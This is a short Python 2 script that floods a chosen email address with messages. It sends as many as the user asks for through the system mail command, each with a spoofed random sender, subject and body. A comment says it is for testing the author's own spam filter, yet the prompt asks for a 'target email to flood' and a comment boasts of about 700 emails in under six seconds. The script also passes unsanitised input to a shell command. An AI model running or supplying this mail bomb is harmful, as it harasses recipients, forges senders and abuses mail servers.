#/usr/bin/python
# To be used only for test between systems one owns
# Creating this to test my own spam filtering program
import os
import hashlib

target_email = raw_input("Enter target email to flood: ")
# Need to validate that the email is correct
print target_email

try:
	num_emails = int(raw_input("Enter number of emails: "))
except:
	print "Integers only valid!"
	exit(1)

# So now to actually send all the messages
# The hashing could be made simpler but it sent
# about 700 emails in < 6 seconds
for emSent in range(1, num_emails+1):
	# Create the psuedorandom From
	ranFrom = str(emSent) + "lolSalt"
	emFromHash = hashlib.md5()
	emFromHash.update(ranFrom)
	emFromUser = emFromHash.hexdigest()
	emFromHash.update(ranFrom)
	emAtDomain = emFromHash.hexdigest()
	emFROM = emFromUser + "@" + emAtDomain + ".com"
	# Create the psuedorandom message
	ranMess = str(emSent) + "saltlol?"
	emMessHash = hashlib.md5()
	emMessHash.update(ranMess)
	emMess = emMessHash.hexdigest()
	# Create the pseudorandom subject
	emMessHash.update(str(emSent))
	emSubj = emMessHash.hexdigest()

	command = "echo " + emMess + " | mail -s " + emSubj + " " + target_email + " -aFrom:" + emFROM
	os.system(command)
	

	
